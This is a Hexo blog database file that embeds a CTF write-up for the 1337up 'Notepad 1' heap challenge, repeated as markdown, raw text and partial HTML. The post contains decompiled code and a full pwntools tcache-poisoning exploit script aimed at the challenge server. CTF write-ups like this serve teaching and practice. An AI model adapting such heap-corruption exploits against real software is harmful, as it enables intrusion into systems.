{"meta":{"version":1,"warehouse":"5.0.1"},"models":{"Asset":[{"_id":"source/pfp.jpg","path":"pfp.jpg","modified":1,"renderable":0},{"_id":"source/images/pfp.jpg","path":"images/pfp.jpg","modified":1,"renderable":0},{"_id":"themes/oranges/source/css/base.css","path":"css/base.css","modified":1,"renderable":1},{"_id":"themes/oranges/source/css/color-scheme.css","path":"css/color-scheme.css","modified":1,"renderable":1},{"_id":"themes/oranges/source/css/comments.css","path":"css/comments.css","modified":1,"renderable":1},{"_id":"themes/oranges/source/css/github-markdown.css","path":"css/github-markdown.css","modified":1,"renderable":1},{"_id":"themes/oranges/source/css/highlight.css","path":"css/highlight.css","modified":1,"renderable":1},{"_id":"themes/oranges/source/css/main.styl","path":"css/main.styl","modified":1,"renderable":1},{"_id":"themes/oranges/source/images/avatar.png","path":"images/avatar.png","modified":1,"renderable":1},{"_id":"themes/oranges/source/images/favicon.png","path":"images/favicon.png","modified":1,"renderable":1},{"_id":"themes/oranges/source/js/activeNav.js","path":"js/activeNav.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/js/backtotop.js","path":"js/backtotop.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/js/catalog.js","path":"js/catalog.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/js/codeCopy.js","path":"js/codeCopy.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/js/colorscheme.js","path":"js/colorscheme.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/js/fancybox.js","path":"js/fancybox.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/js/search.js","path":"js/search.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/js/shares.js","path":"js/shares.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/clipboard.min.js","path":"plugins/clipboard.min.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/gitalk.css","path":"plugins/gitalk.css","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/gitalk.min.js","path":"plugins/gitalk.min.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/jquery.fancybox.min.css","path":"plugins/jquery.fancybox.min.css","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/jquery.fancybox.min.js","path":"plugins/jquery.fancybox.min.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/jquery.min.js","path":"plugins/jquery.min.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/valine.min.js","path":"plugins/valine.min.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/waline.css","path":"plugins/waline.css","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/waline.js","path":"plugins/waline.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/waline.mjs","path":"plugins/waline.mjs","modified":1,"renderable":1},{"_id":"themes/oranges/source/css/figcaption/mac-block.css","path":"css/figcaption/mac-block.css","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/mathjax/tex-chtml.js","path":"plugins/mathjax/tex-chtml.js","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Main-Regular.woff","path":"plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Main-Regular.woff","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Math-Italic.woff","path":"plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Math-Italic.woff","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Size1-Regular.woff","path":"plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Size1-Regular.woff","modified":1,"renderable":1},{"_id":"themes/oranges/source/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Zero.woff","path":"plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Zero.woff","modified":1,"renderable":1}],"Cache":[{"_id":"source/pfp.jpg","hash":"0811066611f06f3b6917a46ddd479da9ad7a9c86","modified":1732031477031},{"_id":"source/_posts/1337ctfwriteups.md","hash":"81a7c8b11ed1372d1f6674403a70738fb48bfd7a","modified":1732031477146},{"_id":"source/_posts/libwary.md","hash":"c55f553725fb59109c7ead8f12a0709fa6fa7a24","modified":1732031816667},{"_id":"source/images/pfp.jpg","hash":"0811066611f06f3b6917a46ddd479da9ad7a9c86","modified":1732031477031},{"_id":"themes/oranges/source/css/_common/layout/header.styl","hash":"da39a3ee5e6b4b0d3255bfef95601890afd80709","modified":1732031477046},{"_id":"themes/oranges/.gitignore","hash":"235a46a06c2464f3e8142d7b78d853ec621038b3","modified":1732031477031},{"_id":"themes/oranges/LICENSE","hash":"dbd3fa0b99b0acb027e8671cef34a6491e839758","modified":1732031477032},{"_id":"themes/oranges/README.md","hash":"c5ca9783e7a0351de1909af1b59e1abe2cce4a31","modified":1732031477033},{"_id":"themes/oranges/README-zh.md","hash":"3e9d9e066d298790df1663ea8a9bc598eddb7bcd","modified":1732031477032},{"_id":"themes/oranges/layout/archive.ejs","hash":"ac08ee5bdb60b625896d16540ab444be844cab2b","modified":1732031477041},{"_id":"themes/oranges/_config.yml","hash":"b51633d43141ecaed290144a15789e94b3336fd6","modified":1732031477033},{"_id":"themes/oranges/layout/category.ejs","hash":"b731a87eab749d49b699af990149dfc53374f4ea","modified":1732031477041},{"_id":"themes/oranges/layout/post.ejs","hash":"2dabf35adc38c640209f33eede3b9c92a2a9c6d2","modified":1732031477042},{"_id":"themes/oranges/layout/index.ejs","hash":"9e05d7e8ca4bf38a0c36b8c1db29465b7cc561c7","modified":1732031477042},{"_id":"themes/oranges/layout/layout.ejs","hash":"a4ca62256a067680d703c0b76d9b71cdd9773f2d","modified":1732031477042},{"_id":"themes/oranges/layout/tag.ejs","hash":"209dc1ab4bfdf8123fc18a0ceefcd96787b44596","modified":1732031477043},{"_id":"themes/oranges/languages/de.yml","hash":"ad90132d331b9c5684129f2f08ddeaff27e1a4da","modified":1732031477034},{"_id":"themes/oranges/languages/default.yml","hash":"c0493633b1d07ec130b24ac3fd27717ffcd30731","modified":1732031477034},{"_id":"themes/oranges/languages/ja.yml","hash":"ebd19d2b2329767530145bc0822d1f883783049d","modified":1732031477035},{"_id":"themes/oranges/languages/fr.yml","hash":"dfc3fc2513f6d8a50babdb2076d5bcaba52339f7","modified":1732031477035},{"_id":"themes/oranges/languages/es.yml","hash":"a75cef476c5838772690240d23b36f334bfe147b","modified":1732031477034},{"_id":"themes/oranges/languages/ko.yml","hash":"71152d310678022fb810445a63df9e4f710de2c9","modified":1732031477035},{"_id":"themes/oranges/languages/nl.yml","hash":"728a17f83f604f59b52cf3fb0ce1b2434e96bf4c","modified":1732031477035},{"_id":"themes/oranges/languages/no.yml","hash":"2c2038d86738da9de2c4b3668c5e5928240380ce","modified":1732031477036},{"_id":"themes/oranges/languages/pt.yml","hash":"6d924968447e2b4a31de9ac1329326db89ab5a27","modified":1732031477036},{"_id":"themes/oranges/languages/ru.yml","hash":"509cb6b67625d5b46a38fab387d946c7a336cad4","modified":1732031477036},{"_id":"themes/oranges/languages/zh-TW.yml","hash":"28ef519d0eccca0aa6f7637204fcdd8286532e78","modified":1732031477037},{"_id":"themes/oranges/languages/zh-CN.yml","hash":"133c650074fbf18e4f90bfacb34487cdbfcc9191","modified":1732031477037},{"_id":"themes/oranges/layout/_partial/backtotop.ejs","hash":"6b19f389755cbad990905c9284a13c70971e72b0","modified":1732031477037},{"_id":"themes/oranges/layout/_partial/clipboard.ejs","hash":"7fd17533fb4c5dd7524a381934ffcd5c27b0b6aa","modified":1732031477038},{"_id":"themes/oranges/layout/_partial/colorscheme.ejs","hash":"993af90279088a2934a857b4c51c8487e845d3e7","modified":1732031477038},{"_id":"themes/oranges/layout/_partial/comments.ejs","hash":"21656841d84c9d008eaad44c59c9ae0a7dae0791","modified":1732031477039},{"_id":"themes/oranges/layout/_partial/catalog.ejs","hash":"fb871254561b2b6e41d1e0195fc96684c6edc527","modified":1732031477038},{"_id":"themes/oranges/layout/_partial/header.ejs","hash":"929efe6f82f96ab26a4a501922036ec5085846e5","modified":1732031477039},{"_id":"themes/oranges/layout/_partial/mathjax.ejs","hash":"456981c33c943454f25fd025b76ec082f1dc3368","modified":1732031477040},{"_id":"themes/oranges/layout/_partial/search.ejs","hash":"a6df7b553ff03b5f292571168aefe9e6dbba656a","modified":1732031477041},{"_id":"themes/oranges/layout/_partial/navigation.ejs","hash":"449e17212e5bd98575a4c157a61cf8c801ef0e7b","modified":1732031477040},{"_id":"themes/oranges/layout/_partial/shares.ejs","hash":"5d50422f3949695cd28a525ef23536d632c271f7","modified":1732031477041},{"_id":"themes/oranges/source/css/base.css","hash":"d3d22be5257d03a61f619cbd192c5c7afa69b0a9","modified":1732031477046},{"_id":"themes/oranges/layout/_partial/footer.ejs","hash":"7e491f26c9eec689133f688a341d0bd2d3314a09","modified":1732031477039},{"_id":"themes/oranges/source/css/color-scheme.css","hash":"b4a413e41e29e25e6472a1df2e8df36601c20174","modified":1732031477047},{"_id":"themes/oranges/source/css/comments.css","hash":"2b97964a2c59990ec5c8a3abcfab160c2205ad80","modified":1732031477047},{"_id":"themes/oranges/source/css/github-markdown.css","hash":"805b32a92605b78cdc625c8e9339f92e13dfa575","modified":1732031477048},{"_id":"themes/oranges/source/css/main.styl","hash":"988a14ee1cdad166c7a9c9bd58d025d5594076c1","modified":1732031477049},{"_id":"themes/oranges/source/images/avatar.png","hash":"642ef58c0781d0f1885775ddd349ca7af65f24b0","modified":1732031477049},{"_id":"themes/oranges/source/css/highlight.css","hash":"960cfd4a2f66434c36d1d72731bb2e57a3740345","modified":1732031477049},{"_id":"themes/oranges/source/images/favicon.png","hash":"21cf9c2e9c36c244a6542a3b6c220f13fa1a67cc","modified":1732031477049},{"_id":"themes/oranges/source/js/activeNav.js","hash":"65150cda5900eab5dc4652f9698512bafb5833e3","modified":1732031477050},{"_id":"themes/oranges/source/js/backtotop.js","hash":"1193edfd3cb032a72ba1c100be83bd459a2f63ac","modified":1732031477050},{"_id":"themes/oranges/source/js/codeCopy.js","hash":"fd4b24a2cd985d857f6ab51853e72b623ce8765a","modified":1732031477051},{"_id":"themes/oranges/source/js/catalog.js","hash":"3c8215aaad1ef05323b74b5f135b0bad2a3385a6","modified":1732031477050},{"_id":"themes/oranges/source/js/colorscheme.js","hash":"8b5626c40874c6cd39ba0fdeb3f2f3439d85da7d","modified":1732031477051},{"_id":"themes/oranges/source/js/search.js","hash":"fbac709e9a6befddbf8b31fd571b072e3de27b73","modified":1732031477051},{"_id":"themes/oranges/source/js/fancybox.js","hash":"ed4c22785ec2c0764792011be19258dce3995487","modified":1732031477051},{"_id":"themes/oranges/source/js/shares.js","hash":"838daa82d612ce632762343dbf6153343d0036f8","modified":1732031477052},{"_id":"themes/oranges/source/plugins/clipboard.min.js","hash":"d62dcb0905e038e69ff24ab9eef9e3306d45535e","modified":1732031477052},{"_id":"themes/oranges/source/plugins/gitalk.css","hash":"4c0d5510ea487b0fe63e96464ab0b381565cc273","modified":1732031477052},{"_id":"themes/oranges/source/plugins/jquery.fancybox.min.css","hash":"2e6a66987dbc7a57bbfd2655bce166739b4ba426","modified":1732031477057},{"_id":"themes/oranges/source/plugins/waline.css","hash":"25364b45ca67bc573d18bd15e252db737cfa3c0d","modified":1732031477066},{"_id":"themes/oranges/source/css/figcaption/mac-block.css","hash":"db51c58260e441632734d9bc2d41be2aa31df7c1","modified":1732031477048},{"_id":"themes/oranges/source/css/_common/comments/index.styl","hash":"7085df46c9d80aa1ea1cd361d75dfb8815e2d3da","modified":1732031477044},{"_id":"themes/oranges/source/css/_common/comments/valine.styl","hash":"23ee39dc6bb081fcb424746d1cc0c9a8cfa43d81","modified":1732031477044},{"_id":"themes/oranges/source/css/_common/layout/footer.styl","hash":"c83b8b135e10327f6c9779b4708bb625adc6462c","modified":1732031477046},{"_id":"themes/oranges/source/css/_common/layout/index.styl","hash":"967a2fc81e5394c95b5172680d41c48c35942995","modified":1732031477046},{"_id":"themes/oranges/source/css/_common/components/fancybox.styl","hash":"9cf143a4215d28f851e7dd47dfa613719f4756d0","modified":1732031477044},{"_id":"themes/oranges/source/css/_common/utils/index.styl","hash":"cf587cb1e8cb0cc6b47efa9944094e7558a15c92","modified":1732031477046},{"_id":"themes/oranges/source/css/_common/components/index.styl","hash":"6aa40f2cfe058c7b73dcde03586c71421725f842","modified":1732031477045},{"_id":"themes/oranges/source/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Size1-Regular.woff","hash":"9c98f9f022647eb802434947e062b569ccedd5f0","modified":1732031477060},{"_id":"themes/oranges/source/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Main-Regular.woff","hash":"89d2c8d274693c5a6e250e96e2a2e26e25619079","modified":1732031477059},{"_id":"themes/oranges/source/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Zero.woff","hash":"6712cf0aa5c12edc1cbbca8a1732a9cde0854c48","modified":1732031477060},{"_id":"themes/oranges/source/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Math-Italic.woff","hash":"91a4025dd3b18ca6bda63a215869773705435041","modified":1732031477059},{"_id":"themes/oranges/source/plugins/jquery.fancybox.min.js","hash":"3154fd527a002788848d9fec61d522048890e516","modified":1732031477057},{"_id":"themes/oranges/source/plugins/jquery.min.js","hash":"0c3192b500a4fd550e483cf77a49806a5872185b","modified":1732031477058},{"_id":"themes/oranges/source/plugins/valine.min.js","hash":"c2f2b1b0346e28ceae19f4b3d174f033311aa060","modified":1732031477066},{"_id":"themes/oranges/source/plugins/waline.js","hash":"0f46a69ce82aefd07e445cb05ff6c941e83da9d1","modified":1732031477067},{"_id":"themes/oranges/source/plugins/waline.mjs","hash":"5ead58d3654d8618fc6929e862d03c787cbf21f7","modified":1732031477068},{"_id":"themes/oranges/source/plugins/gitalk.min.js","hash":"1df59d7e5481ac2917c7043b28883393675dcaf9","modified":1732031477056},{"_id":"themes/oranges/source/plugins/mathjax/tex-chtml.js","hash":"bef586271c8246d003509a68b8f11181d967847d","modified":1732031477064},{"_id":"public/2024/1337ctfwriteups/index.html","hash":"ed9abed267771f289682d4a27fe5f7e5fe382c83","modified":1732032785908},{"_id":"public/2024/libwary/index.html","hash":"7003776a05d8f2217a1a876b003679d74aaa7fa9","modified":1732032785908},{"_id":"public/archives/index.html","hash":"f334a387566dc389e6096193e86bd918ca624902","modified":1732032785908},{"_id":"public/archives/2024/index.html","hash":"da9f41d4620c3a241f15a3be19ca6f3e9cfd8353","modified":1732032785908},{"_id":"public/index.html","hash":"0e14ffd2ceae77c068afa59fbb453399c6cafe02","modified":1732032785908},{"_id":"public/archives/2024/02/index.html","hash":"e2964752db92d40c2e5ae1e5daf15cee9c2cbbc0","modified":1732032785908},{"_id":"public/archives/2024/11/index.html","hash":"46c0c8cf7a2758740c904f207f2981457156fe3c","modified":1732032785908},{"_id":"public/pfp.jpg","hash":"0811066611f06f3b6917a46ddd479da9ad7a9c86","modified":1732032785908},{"_id":"public/images/avatar.png","hash":"642ef58c0781d0f1885775ddd349ca7af65f24b0","modified":1732032785908},{"_id":"public/images/pfp.jpg","hash":"0811066611f06f3b6917a46ddd479da9ad7a9c86","modified":1732032785908},{"_id":"public/images/favicon.png","hash":"21cf9c2e9c36c244a6542a3b6c220f13fa1a67cc","modified":1732032785908},{"_id":"public/css/main.css","hash":"55ebc953b7cdf77bbb55238d42367d36fde25418","modified":1732032785908},{"_id":"public/css/base.css","hash":"6fc8a265777c40336678c9b5cc033f7399b55459","modified":1732032785908},{"_id":"public/css/github-markdown.css","hash":"0dc8e66ad2121924445150eb59a5f6091662f6f7","modified":1732032785908},{"_id":"public/css/comments.css","hash":"0bf6e453cd42da1dc96b4f90b5023e437d1454e0","modified":1732032785908},{"_id":"public/css/color-scheme.css","hash":"ec1e624f750e8caf5d463437b06bd1f705173467","modified":1732032785908},{"_id":"public/css/highlight.css","hash":"7ebfcbb58e87dd0436ab9538641eb6577fa7a8f8","modified":1732032785908},{"_id":"public/js/activeNav.js","hash":"06aa9a2985f1d328f0b7fe69a28bee31f16ebb1a","modified":1732032785908},{"_id":"public/js/catalog.js","hash":"3f895778af2029bff0cd588eeca0a8b64845065d","modified":1732032785908},{"_id":"public/js/backtotop.js","hash":"0be1bd072a7a34ce50d72376cad722023e772e6d","modified":1732032785908},{"_id":"public/js/codeCopy.js","hash":"3fab7bf3e0d22326440af1963e83448f8b8b4ab6","modified":1732032785908},{"_id":"public/js/colorscheme.js","hash":"1290f902b5651bf4d66187b5695ec90dc3ec70a8","modified":1732032785908},{"_id":"public/js/fancybox.js","hash":"b217d56f8db94498d7e272d164abac6ab1c07ddd","modified":1732032785908},{"_id":"public/js/search.js","hash":"374efc788268330edd7ca0c91a43e75f7ec4149c","modified":1732032785908},{"_id":"public/js/shares.js","hash":"aa0a3dd5c24efe7945351f7ac22d0f84a93e350c","modified":1732032785908},{"_id":"public/plugins/clipboard.min.js","hash":"9a7cb405f9beed005891587d41f76a0720893ffc","modified":1732032785908},{"_id":"public/plugins/gitalk.css","hash":"61d71cb30f5f34cbb1f2b5bc469784d6cb908c22","modified":1732032785908},{"_id":"public/plugins/jquery.fancybox.min.css","hash":"2e6a66987dbc7a57bbfd2655bce166739b4ba426","modified":1732032785908},{"_id":"public/plugins/jquery.fancybox.min.js","hash":"b2b093d8f5ffeee250c8d0d3a2285a213318e4ea","modified":1732032785908},{"_id":"public/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Main-Regular.woff","hash":"89d2c8d274693c5a6e250e96e2a2e26e25619079","modified":1732032785908},{"_id":"public/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Math-Italic.woff","hash":"91a4025dd3b18ca6bda63a215869773705435041","modified":1732032785908},{"_id":"public/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Size1-Regular.woff","hash":"9c98f9f022647eb802434947e062b569ccedd5f0","modified":1732032785908},{"_id":"public/plugins/mathjax/output/chtml/fonts/woff-v2/MathJax_Zero.woff","hash":"6712cf0aa5c12edc1cbbca8a1732a9cde0854c48","modified":1732032785908},{"_id":"public/plugins/jquery.min.js","hash":"0dc32db4aa9c5f03f3b38c47d883dbd4fed13aae","modified":1732032785908},{"_id":"public/plugins/valine.min.js","hash":"d081a412c63411a75a3a880ddece65335d1c3ee8","modified":1732032785908},{"_id":"public/css/figcaption/mac-block.css","hash":"d923323312d78ecb40cb60c093dba36b0127db68","modified":1732032785908},{"_id":"public/plugins/waline.css","hash":"ba52d91d4685f8e07423a5651fea8a8f5151f457","modified":1732032785908},{"_id":"public/plugins/waline.js","hash":"c26a8b22924813d883fb23e232063dce9b4e01c3","modified":1732032785908},{"_id":"public/plugins/gitalk.min.js","hash":"564fc7c731d05fa70d71ef853a2c8cc7725739e2","modified":1732032785908},{"_id":"public/plugins/waline.mjs","hash":"5ead58d3654d8618fc6929e862d03c787cbf21f7","modified":1732032785908},{"_id":"public/plugins/mathjax/tex-chtml.js","hash":"bef586271c8246d003509a68b8f11181d967847d","modified":1732032785908}],"Category":[],"Data":[],"Page":[],"Post":[{"title":"1337ctfwriteups","date":"2024-11-19T13:32:57.000Z","_content":"I played in 1337up CTF last weekend but no one wants to hear about my day so here are my writeups for the few pwn challenges I solved.\n\n# Notepad 1\n#### baby heap pwn\n## Analysis\nWe are presented with a few files to host the challenge with a docker instance locally but I'm lazy and there's not much point anyways so I don't use it.\n\nThe only really important file is the challenge binary itself, as even though the libc and linker were provided I didn't end up using them\n\nOpening it up in Ghidra, we can see it looks like a pretty simple CRUD heap challenge with a win function.\nAfter looking around a bit, I found the main vulnerability. When creating a note, you are only allowed to write to the allocated chunk the size of the chunk, but when updating it, you are allowed to write up to a set amount of 0x100 bytes.\n\n`createNote`:\n```c\n  puts(\"How large you want the note to be?\");\n  printf(\"> \");\n  __isoc99_scanf(&DAT_001014c3,&size);\n  uVar1 = index;\n  pvVar2 = malloc(size);\n  *(void **)(notepad + (ulong)uVar1 * 8) = pvVar2;\n  puts(\"Add your note:\");\n  printf(\"> \");\n  local_28 = *(long *)(notepad + (ulong)index * 8);\n  sVar3 = read(0,*(void **)(notepad + (ulong)index * 8),size);\n```\n`editNote`:\n```c\n  puts(\"Your changes:\");\n  printf(\"> \");\n  read(0,*(void **)(notepad + (ulong)index * 8),0x100);\n```\nThis gives us an easy write primitive in subsequent heap chunks, meaning we can do things like overwrite metadata in the following heap chunks. \n\n# The plan\nArmed with a write primitive, we can start planning our exploit. The binary very generously gives us a PIE leak at the start of the program, meaning there is essentially no PIE, so we just need to find a way to call our win function. \n\nSpeaking of, here it is in Ghidra (or at least the important part):\n```c\nvoid secretNote(void)\n\n{\n  int __fd;\n  size_t __n;\n  long in_FS_OFFSET;\n  undefined local_418 [1032];\n  undefined8 local_10;\n  \n  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);\n  if (key != -0x35014542) {\n    puts(\"You don\\'t have access!\");\n                    /* WARNING: Subroutine does not return */\n    exit(-1);\n  }\n /* Print flag code */\n}\n```\n\nThat number `-0x35014542` is actually `0xcafebabe` but because its a signed number Ghidra thinks its a negative number.\nWe can see that to get the flag we must first write 0xcafebabe to the global variable `key` then call secretNote (which there is an option for in the menu).\n\n---\nSo how can we write to `key`? Recall that we have an overflow in the update function that allows us to overwrite the subsequent chunks of an arbitrary chunk.\n\nThis means that we can overwrite the FD and BK pointers of a freed chunk to point to `key`, which will cause the program to think that `key` is a freed chunk in the tcache,  and will return a pointer to `key` after allocating twice.\n\nSo, we can allocate two chunks and write 0xcafebabe to the second one, which will be at `key`, then just call the win function.\n\nBefore overwrite:\n```\n0x00: 0x0000000000000000 0x0000000000000020 (chunk1)\n0x10: 0x6161616161616161 0x6161616161616161\n0x20: 0x6161616161616161 0x0000000000000020 (chunk2)\n0x30: 0x(NULL_FD_PTR)\n```\nAfter overwrite:\n```\n0x00: 0x0000000000000000 0x0000000000000020 (chunk1)\n0x10: 0x6161616161616161 0x6161616161616161\n0x20: 0x6161616161616161 0x0000000000000020 (chunk2)\n0x30: 0x(OUR_FD_PTR)\n```\n\n```py\n#!/usr/bin/env python3\n\nfrom pwn import *\n\nexe = ELF(\"./notepad_patched\")\nlibc = ELF(\"./libc.so.6\")\nld = ELF(\"./ld-linux-x86-64.so.2\")\n\ncontext.binary = exe\n\n\ndef conn():\n    if args.REMOTE:\n        p = remote(\"notepad.ctf.intigriti.io\", 1341)\n    else:\n        p = process([exe.path])\n        if args.DB:\n            gdb.attach(p)\n\n    return p\n\n\ndef create(p, i, size, data):\n    p.sendlineafter(b'> ', b'1')\n    p.sendlineafter(b'> ', str(i).encode())\n    p.sendlineafter(b'> ', str(size).encode())\n    p.sendlineafter(b'> ', data)\n\ndef read(p, i):\n    p.sendlineafter(b'> ', b'2')\n    p.sendlineafter(b'> ', str(i).encode())\n    return p.recvuntil(b'\\n\\n\\nChoose', drop=True)\n\ndef update(p, i, data):\n    p.sendlineafter(b'> ', b'3')\n    p.sendlineafter(b'> ', str(i).encode())\n    p.sendlineafter(b'> ', data)\n\ndef delete(p, i):\n    p.sendlineafter(b'> ', b'4')\n    p.sendlineafter(b'> ', str(i).encode())\n\ndef main():\n    p = conn()\n\n    # good luck pwning :)\n    p.recvuntil(b'gift: ')\n    exe_leak = int(p.recvline().strip(), 16)\n    exe.address = exe_leak - exe.sym['main']\n    print(hex(exe.address))\n\n    create(p, 0, 16, b'deadbeef')  # chunk1\n    create(p, 1, 16, b'deadc0de')  # chunk2\n    delete(p, 1)                   # Free chunk2 to put it in tcache\n\n    payload = b'a' * 24            # Pad until FD ptr\n    payload += flat(0x21, exe.sym['key']) # Overwrite FD\n\n    create(p, 2, 16, b'cafef00d')  # Alloc once to use actual tcache chunk\n    create(p, 3, 16, flat(0xcafebabe))  # Alloc once more to use our fake chunk\n\n    p.sendlineafter(b'> ', b'5')\n\n    p.interactive()\n\nif __name__ == \"__main__\":\n    main()\n```\n\nThis was my first ever pwn writeup and second writeup ever so please give feedback thanks.\n","source":"_posts/1337ctfwriteups.md","raw":"---\ntitle: 1337ctfwriteups\ndate: 2024-11-19 21:32:57\ntags:\n---\nI played in 1337up CTF last weekend but no one wants to hear about my day so here are my writeups for the few pwn challenges I solved.\n\n# Notepad 1\n#### baby heap pwn\n## Analysis\nWe are presented with a few files to host the challenge with a docker instance locally but I'm lazy and there's not much point anyways so I don't use it.\n\nThe only really important file is the challenge binary itself, as even though the libc and linker were provided I didn't end up using them\n\nOpening it up in Ghidra, we can see it looks like a pretty simple CRUD heap challenge with a win function.\nAfter looking around a bit, I found the main vulnerability. When creating a note, you are only allowed to write to the allocated chunk the size of the chunk, but when updating it, you are allowed to write up to a set amount of 0x100 bytes.\n\n`createNote`:\n```c\n  puts(\"How large you want the note to be?\");\n  printf(\"> \");\n  __isoc99_scanf(&DAT_001014c3,&size);\n  uVar1 = index;\n  pvVar2 = malloc(size);\n  *(void **)(notepad + (ulong)uVar1 * 8) = pvVar2;\n  puts(\"Add your note:\");\n  printf(\"> \");\n  local_28 = *(long *)(notepad + (ulong)index * 8);\n  sVar3 = read(0,*(void **)(notepad + (ulong)index * 8),size);\n```\n`editNote`:\n```c\n  puts(\"Your changes:\");\n  printf(\"> \");\n  read(0,*(void **)(notepad + (ulong)index * 8),0x100);\n```\nThis gives us an easy write primitive in subsequent heap chunks, meaning we can do things like overwrite metadata in the following heap chunks. \n\n# The plan\nArmed with a write primitive, we can start planning our exploit. The binary very generously gives us a PIE leak at the start of the program, meaning there is essentially no PIE, so we just need to find a way to call our win function. \n\nSpeaking of, here it is in Ghidra (or at least the important part):\n```c\nvoid secretNote(void)\n\n{\n  int __fd;\n  size_t __n;\n  long in_FS_OFFSET;\n  undefined local_418 [1032];\n  undefined8 local_10;\n  \n  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);\n  if (key != -0x35014542) {\n    puts(\"You don\\'t have access!\");\n                    /* WARNING: Subroutine does not return */\n    exit(-1);\n  }\n /* Print flag code */\n}\n```\n\nThat number `-0x35014542` is actually `0xcafebabe` but because its a signed number Ghidra thinks its a negative number.\nWe can see that to get the flag we must first write 0xcafebabe to the global variable `key` then call secretNote (which there is an option for in the menu).\n\n---\nSo how can we write to `key`? Recall that we have an overflow in the update function that allows us to overwrite the subsequent chunks of an arbitrary chunk.\n\nThis means that we can overwrite the FD and BK pointers of a freed chunk to point to `key`, which will cause the program to think that `key` is a freed chunk in the tcache,  and will return a pointer to `key` after allocating twice.\n\nSo, we can allocate two chunks and write 0xcafebabe to the second one, which will be at `key`, then just call the win function.\n\nBefore overwrite:\n```\n0x00: 0x0000000000000000 0x0000000000000020 (chunk1)\n0x10: 0x6161616161616161 0x6161616161616161\n0x20: 0x6161616161616161 0x0000000000000020 (chunk2)\n0x30: 0x(NULL_FD_PTR)\n```\nAfter overwrite:\n```\n0x00: 0x0000000000000000 0x0000000000000020 (chunk1)\n0x10: 0x6161616161616161 0x6161616161616161\n0x20: 0x6161616161616161 0x0000000000000020 (chunk2)\n0x30: 0x(OUR_FD_PTR)\n```\n\n```py\n#!/usr/bin/env python3\n\nfrom pwn import *\n\nexe = ELF(\"./notepad_patched\")\nlibc = ELF(\"./libc.so.6\")\nld = ELF(\"./ld-linux-x86-64.so.2\")\n\ncontext.binary = exe\n\n\ndef conn():\n    if args.REMOTE:\n        p = remote(\"notepad.ctf.intigriti.io\", 1341)\n    else:\n        p = process([exe.path])\n        if args.DB:\n            gdb.attach(p)\n\n    return p\n\n\ndef create(p, i, size, data):\n    p.sendlineafter(b'> ', b'1')\n    p.sendlineafter(b'> ', str(i).encode())\n    p.sendlineafter(b'> ', str(size).encode())\n    p.sendlineafter(b'> ', data)\n\ndef read(p, i):\n    p.sendlineafter(b'> ', b'2')\n    p.sendlineafter(b'> ', str(i).encode())\n    return p.recvuntil(b'\\n\\n\\nChoose', drop=True)\n\ndef update(p, i, data):\n    p.sendlineafter(b'> ', b'3')\n    p.sendlineafter(b'> ', str(i).encode())\n    p.sendlineafter(b'> ', data)\n\ndef delete(p, i):\n    p.sendlineafter(b'> ', b'4')\n    p.sendlineafter(b'> ', str(i).encode())\n\ndef main():\n    p = conn()\n\n    # good luck pwning :)\n    p.recvuntil(b'gift: ')\n    exe_leak = int(p.recvline().strip(), 16)\n    exe.address = exe_leak - exe.sym['main']\n    print(hex(exe.address))\n\n    create(p, 0, 16, b'deadbeef')  # chunk1\n    create(p, 1, 16, b'deadc0de')  # chunk2\n    delete(p, 1)                   # Free chunk2 to put it in tcache\n\n    payload = b'a' * 24            # Pad until FD ptr\n    payload += flat(0x21, exe.sym['key']) # Overwrite FD\n\n    create(p, 2, 16, b'cafef00d')  # Alloc once to use actual tcache chunk\n    create(p, 3, 16, flat(0xcafebabe))  # Alloc once more to use our fake chunk\n\n    p.sendlineafter(b'> ', b'5')\n\n    p.interactive()\n\nif __name__ == \"__main__\":\n    main()\n```\n\nThis was my first ever pwn writeup and second writeup ever so please give feedback thanks.\n","slug":"1337ctfwriteups","published":1,"updated":"2024-11-19T15:51:17.146Z","comments":1,"layout":"post","photos":[],"_id":"cm3onln1t00008ond4yyr57fr","content":"<p>I played in 1337up CTF last weekend but no one wants to hear about my day so here are my writeups for the few pwn challenges I solved.</p>\n<h1 id=\"Notepad-1\"><a href=\"#Notepad-1\" class=\"headerlink\" title=\"Notepad 1\"></a>Notepad 1</h1><h4 id=\"baby-heap-pwn\"><a href=\"#baby-heap-pwn\" class=\"headerlink\" title=\"baby heap pwn\"></a>baby heap pwn</h4><h2 id=\"Analysis\"><a href=\"#Analysis\" class=\"headerlink\" title=\"Analysis\"></a>Analysis</h2><p>We are presented with a few files to host the challenge with a docker instance locally but I’m lazy and there’s not much point anyways 